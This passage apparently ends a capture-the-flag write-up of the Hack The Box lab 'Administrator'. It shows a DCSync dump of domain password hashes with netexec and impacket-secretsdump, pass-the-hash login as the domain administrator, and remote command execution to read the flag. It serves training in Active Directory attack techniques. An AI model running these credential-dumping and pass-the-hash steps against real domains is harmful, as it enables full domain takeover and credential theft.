SMB         10.129.72.143   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.72.143   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::                                                                    
SMB         10.129.72.143   445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                            
SMB         10.129.72.143   445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::                                                                           
SMB         10.129.72.143   445    DC               administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::                                                        
SMB         10.129.72.143   445    DC               administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fea9cd7656be447559d76a1815fbc34d:::                                                       
SMB         10.129.72.143   445    DC               administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:209c2d14059e76f8fe71cf473d6ab46a:::                                                      
SMB         10.129.72.143   445    DC               administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::                                                         
SMB         10.129.72.143   445    DC               administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::                                                         
SMB         10.129.72.143   445    DC               administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::                                                     
SMB         10.129.72.143   445    DC               administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::                                                          
SMB         10.129.72.143   445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::                                                                             
SMB         10.129.72.143   445    DC               [+] Dumped 11 NTDS hashes to /home/kali/.nxc/logs/ntds/DC_10.129.72.143_2026-09-22_191901.ntds of which 10 were added to the database
SMB         10.129.72.143   445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.129.72.143   445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC_10.129.72.143_2026-09-22_191901.ntds | cut -d ':' -f1
```

### DCsync attack – impacket-secretsdump
An alternative way to dump `NTDS` / `DCsync` attack using `impacket-secretsdump`, instead of `netexec`:
```console
┌──(kali㉿kali)-[~/obsidian_vault/github_blog/wilhelm77.github.io]
└─$ impacket-secretsdump ethan:limpbizkit@administrator    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
<SNIP>
[*] Cleaning up...
```

Using the hash of the domain admin, I'll verify that we can successfully authenticate.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [+] administrator.htb\administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
```
Full domain compromise.

Lastly, grab the `root.txt`.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [+] administrator.htb\administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
SMB         10.129.72.143   445    DC               [+] Executed command via wmiexec
SMB         10.129.72.143   445    DC               d1d9dd4d<REDACTED>

```

## Final Words
This concludes my writeup for the box `Administrator`. I hope this read was worth your time.
While this box could be rated easy instead of medium, I found it nonetheless very beneficial for drilling ad basics and getting comfortable with ad related tools like `bloodyAD`.

I do recommend testing with 2 different tools for the same job, like in the [DCsync section](#dcsync-attack), where we used `netexec` and `impacket-secretsdump` to dump the domain hashes, as you never know if a tool might fail you in an exam or a real engagement.


